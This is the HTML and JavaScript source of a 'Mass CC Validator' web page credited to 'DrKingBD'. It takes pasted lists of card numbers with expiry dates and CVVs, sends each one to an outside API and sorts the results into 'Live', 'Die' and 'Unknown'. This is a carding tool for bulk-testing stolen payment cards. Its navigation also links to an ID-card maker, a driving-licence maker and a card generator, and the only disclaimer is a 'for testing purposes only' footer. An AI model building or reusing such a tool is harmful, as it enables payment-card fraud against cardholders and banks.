<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    
    <title>UniCard Checker - Mass CC Validator</title>
    <meta name="description" content="Professional Mass CC Checker tool. Validate lists instantly with detailed response codes.">
    <meta name="author" content="DrKingBD">
    <link rel="canonical" href="https://kingcc.web.app/cc-checker">

    <script src="https://cdn.tailwindcss.com"></script>

    <style>
        @import url('https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap');
        body { font-family: 'Roboto', sans-serif; }

        /* Custom Scrollbar */
        ::-webkit-scrollbar { width: 8px; }
        ::-webkit-scrollbar-track { background: #f1f1f1; }
        ::-webkit-scrollbar-thumb { background: #cbd5e1; border-radius: 4px; }
        ::-webkit-scrollbar-thumb:hover { background: #94a3b8; }

        /* Status Header Styles */
        .status-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 10px 20px;
            font-weight: 500;
            color: white;
            border-radius: 4px 4px 0 0;
        }

        /* Status List Styles */
        .status-list {
            background: white;
            min-height: 50px;
            max-height: 300px;
            overflow-y: auto;
            padding: 10px;
            border: 1px solid #e5e7eb;
            border-top: none;
            border-radius: 0 0 4px 4px;
            font-size: 12px;
            font-family: monospace;
            color: #333;
            box-shadow: 0 2px 4px rgba(0,0,0,0.05);
        }

        /* Badge Style */
        .badge {
            background: white;
            border-radius: 50%;
            padding: 2px 8px;
            font-size: 12px;
            font-weight: bold;
            min-width: 24px;
            text-align: center;
        }

        .text-live { color: #4CAF50; }
        .bg-live { background-color: #4CAF50; }
        
        .text-die { color: #dc2626; }
        .bg-die { background-color: #dc2626; }
        
        .text-unknown { color: #F59E0B; }
        .bg-unknown { background-color: #F59E0B; }

        /* Result Item Spacing */
        .status-list div { margin-bottom: 4px; border-bottom: 1px dashed #eee; padding-bottom: 2px; }
    </style>
</head>
<body class="bg-gray-100 min-h-screen flex flex-col">

    <nav class="bg-blue-900 text-white shadow-md sticky top-0 z-50">
        <div class="max-w-7xl mx-auto px-4">
            <div class="flex justify-between items-center h-16">
                <a href="/" class="font-bold text-xl flex items-center gap-2">
                    <span class="bg-white text-blue-900 px-2 py-1 rounded">Uni</span>Checker
                </a>
                <div class="hidden md:flex space-x-6 items-center">
                    <a href="/" class="hover:text-blue-300 transition">Home</a>
                    <a href="/nid" class="hover:text-blue-300 transition">NID Maker</a>
                    <a href="/drive" class="hover:text-blue-300 transition">Driving License</a>
                    <a href="/cc-gen" class="hover:text-blue-300 transition">CC Gen</a>
                    <a href="/cc-checker" class="text-blue-300 font-bold border-b-2 border-blue-300">CC Checker</a>
                </div>
                <a href="https://t.me/drkingbd" target="_blank" class="bg-blue-500 hover:bg-blue-600 text-white text-sm font-bold py-2 px-4 rounded-full transition flex items-center gap-2">
                    Telegram
                </a>
            </div>
            <div class="md:hidden flex space-x-4 overflow-x-auto pb-3 text-sm whitespace-nowrap px-4">
                <a href="/" class="hover:text-blue-300">Home</a>
                <a href="/cc-gen" class="hover:text-blue-300">CC Gen</a>
                <a href="/cc-checker" class="font-bold text-blue-300">Checker</a>
            </div>
        </div>
    </nav>

    <div class="flex-grow p-4 md:p-6 flex flex-col items-center">
        <div class="w-full max-w-4xl">
            
            <div class="bg-white rounded shadow-sm mb-8 border border-gray-200">
                <div class="p-4">
                    <textarea id="ccList" class="w-full h-64 p-4 text-sm font-mono border border-gray-100 bg-white focus:outline-none focus:border-gray-300 resize-none text-gray-600 placeholder-gray-300" placeholder="53012724539xxxxx|05|2022|653"></textarea>
                </div>
                
                <div class="h-px bg-gray-100 w-full"></div>

                <div class="flex justify-center gap-2 p-4 bg-white">
                    <button onclick="startCheck()" id="btnStart" class="bg-[#4CAF50] hover:bg-green-600 text-white font-medium py-1.5 px-6 rounded text-sm shadow-sm transition">
                        START
                    </button>
                    <button onclick="stopCheck()" id="btnStop" class="bg-[#ef5350] hover:bg-red-600 text-white font-medium py-1.5 px-6 rounded text-sm shadow-sm transition">
                        STOP
                    </button>
                </div>
            </div>

            <div class="space-y-4">
                
                <div>
                    <div class="status-header bg-live">
                        <span>Live</span>
                        <span id="countLive" class="badge text-live">0</span>
                    </div>
                    <div id="listLive" class="status-list"></div>
                </div>

                <div>
                    <div class="status-header bg-die">
                        <span>Die</span>
                        <span id="countDie" class="badge text-die">0</span>
                    </div>
                    <div id="listDie" class="status-list"></div>
                </div>

                <div>
                    <div class="status-header bg-unknown">
                        <span>Unknown</span>
                        <span id="countUnknown" class="badge text-unknown">0</span>
                    </div>
                    <div id="listUnknown" class="status-list"></div>
                </div>

            </div>

        </div>
    </div>

    <footer class="bg-white border-t mt-8 py-6 text-center">
        <p class="text-gray-600">Â© 2025 UniCard Tools.</p>
        <p class="text-xs text-gray-400 mt-1">For testing purposes only.</p>
    </footer>

    <script>
        let isRunning = false;
        let total = 0;
        let checked = 0;

        const counts = {
            live: 0,
            die: 0,
            unknown: 0
        };

        async function startCheck() {
            if (isRunning) return;
            
            const input = document.getElementById('ccList').value;
            const lines = input.split('\n').filter(line => line.trim().length > 10); // Basic filter
            
            if (lines.length === 0) {
                alert("Please enter cards to check.");
                return;
            }

            isRunning = true;
            document.getElementById('btnStart').classList.add('opacity-50', 'cursor-not-allowed');
            
            // Reset UI if starting new
            if(checked === total) { 
               // Only clear if we finished previous or specifically want to reset. 
               // For this UX, let's clear on every new start press.
               clearResults();
            }

            total = lines.length;

            // Process loop
            for (let i = 0; i < total; i++) {
                if (!isRunning) break;

                const ccData = lines[i].trim();
                
                // Update progress or highlight current line? (Optional)
                // For now, just process
                
                await checkCard(ccData);
                
                // Remove processed line from textarea (Common checker behavior)
                const remainingLines = lines.slice(i + 1).join('\n');
                document.getElementById('ccList').value = remainingLines;
            }

            isRunning = false;
            document.getElementById('btnStart').classList.remove('opacity-50', 'cursor-not-allowed');
        }

        function stopCheck() {
            isRunning = false;
            document.getElementById('btnStart').classList.remove('opacity-50', 'cursor-not-allowed');
        }

        function clearResults() {
            counts.live = 0;
            counts.die = 0;
            counts.unknown = 0;
            updateCounts();
            document.getElementById('listLive').innerHTML = '';
            document.getElementById('listDie').innerHTML = '';
            document.getElementById('listUnknown').innerHTML = '';
        }

        function updateCounts() {
            document.getElementById('countLive').innerText = counts.live;
            document.getElementById('countDie').innerText = counts.die;
            document.getElementById('countUnknown').innerText = counts.unknown;
        }

        async function checkCard(ccData) {
            try {
                // Construct URL-encoded body
                const formData = new URLSearchParams();
                formData.append('data', ccData);

                const response = await fetch("https://mock.payate.com/api.php", {
                    method: "POST",
                    headers: {
                        "accept": "*/*",
                        "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
                        "x-requested-with": "XMLHttpRequest"
                    },
                    body: formData
                });

                const result = await response.json();
                
                // Logic based on error code provided in prompt
                // 1 = Live, 2 = Die, 3 = Unknown
                
                if (result.error === 1) {
                    appendResult('listLive', result.msg);
                    counts.live++;
                } else if (result.error === 2) {
                    appendResult('listDie', result.msg);
                    counts.die++;
                } else if (result.error === 3) {
                    appendResult('listUnknown', result.msg);
                    counts.unknown++;
                } else {
                    // Fallback
                    appendResult('listUnknown', result.msg || ccData + " (Invalid Response)");
                    counts.unknown++;
                }

            } catch (error) {
                console.error("Check failed:", error);
                appendResult('listUnknown', `<span class="text-gray-500">${ccData} - Network Error</span>`);
                counts.unknown++;
            }

            updateCounts();
        }

        function appendResult(elementId, htmlContent) {
            const container = document.getElementById(elementId);
            const div = document.createElement('div');
            div.innerHTML = htmlContent;
            // Insert at top
            container.prepend(div);
        }
    </script>
</body>
</html>
